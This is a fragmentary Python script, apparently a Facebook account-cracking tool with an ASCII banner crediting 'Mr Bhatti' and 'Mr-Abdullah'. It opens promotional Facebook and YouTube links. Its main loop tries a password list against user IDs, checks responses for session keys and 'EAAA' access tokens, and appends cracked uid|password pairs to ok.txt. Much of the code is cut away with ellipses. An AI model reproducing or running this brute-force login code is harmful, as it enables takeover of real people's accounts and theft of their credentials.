...
def notice():
	...
	os.system("xdg-open https://www.facebook.com/groups/447671328737321/permalink/2365540383617063/?app=fbl")
	subprocess.check_output(["am", "start", "https://www.facebook.com/jhon.khokhar.374permalink/2365540383617063/?app=fbl"])
...
\___\_\__,_/_/   \___/____/_/ /_/_/ √Master Mind🥺❤️                                     
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Mr Bhatti\x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version : 6\x1b[0m\x1b[1;97m] \033[1;37m 
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : Mr-Abdullah \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : www.gitclone//github.com/Approval.txt \x1b[0m\x1b[1;97m]
...
───────────────────────────────────────────────────────× 
    """)
		...
		subprocess.check_output(["am", "start", "https://youtube.com/channel/UCMuSUv52AuPQGFB1UZN61Zw"])
		print("───────────────────────────────────────────────────────× ")
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;97m   [=Bhatti=CP=>] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("   [=Bhatti=CP=>]  %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;92m   [=Bhatti=OK=>] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("   [=Bhatti=OK=>]  %s|%s\n"%(uid, pw))
				break
			else:
				continue
